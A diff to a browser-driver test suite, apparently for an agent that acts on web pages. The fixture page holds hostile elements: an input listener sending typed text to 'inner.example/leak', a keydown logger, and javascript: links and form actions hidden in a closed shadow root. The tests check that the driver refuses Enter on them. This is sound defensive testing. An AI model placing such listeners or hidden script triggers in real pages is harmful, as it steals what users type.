@@ -42,7 +42,9 @@ const PAGE = `<!doctype html><html><head><link rel="stylesheet" href="/style.css
 <button onclick="setTimeout(()=>window.open('https://fixture.example/popup'),400)" style="position:absolute;left:400px;top:440px;width:100px;height:20px">later</button>
 <img src="https://inner.example/pixel.png" style="position:absolute;left:400px;top:0;width:1px;height:1px">
 <div style="height:4000px"></div>
-<script>document.getElementById("host").attachShadow({mode:"closed"}).innerHTML='<a href="javascript:window.shadowran=true" style="display:block;width:200px;height:30px">s</a>';
+<form action="/safe" style="position:absolute;left:400px;top:480px;margin:0"><input id="implicit" style="width:100px;height:20px"><button formaction="javascript:window.implicitran=true" style="width:60px;height:20px">Go</button></form>
+<script>const shadow=document.getElementById("host").attachShadow({mode:"closed"});shadow.innerHTML='<a href="javascript:window.shadowran=true" style="display:block;width:200px;height:30px">s</a>';
+window.focusShadow=()=>shadow.querySelector("a").focus();
 document.getElementById("user").addEventListener("input",(e)=>{new Image().src="https://inner.example/leak?p="+encodeURIComponent(e.target.value)});
 window.keys=[];addEventListener("keydown",(e)=>keys.push(e.key));
 addEventListener("mousemove",(e)=>{window.mx=e.clientX;window.my=e.clientY});
@@ -404,7 +406,17 @@ describe("Driver", { timeout: 120_000 }, () => {
     expect(await driver.execute({ tool: "keypress", key: "Enter" })).toMatchObject({ outcome: "refused" });
     await state(b, `document.getElementById("sframe").contentDocument.querySelector("a").focus()`);
     expect(await driver.execute({ tool: "keypress", key: "Enter" })).toMatchObject({ outcome: "refused" });
-    expect(await state(b, "[window.frameran, window.plainform]")).toEqual([null, null]);
+    // A link focused inside a closed shadow root, and Enter in a field whose form's default button goes elsewhere.
+    await state(b, "focusShadow()");
+    expect(await driver.execute({ tool: "keypress", key: "Enter" })).toMatchObject({ outcome: "refused" });
+    await (await walkPage(b)).focus("#implicit");
+    expect(await driver.execute({ tool: "keypress", key: "Enter" })).toMatchObject({ outcome: "refused" });
+    expect(await state(b, "[window.frameran, window.plainform, window.shadowran, window.implicitran]")).toEqual([
+      null,
+      null,
+      null,
+      null,
+    ]);
     await driver.close();
   });
 
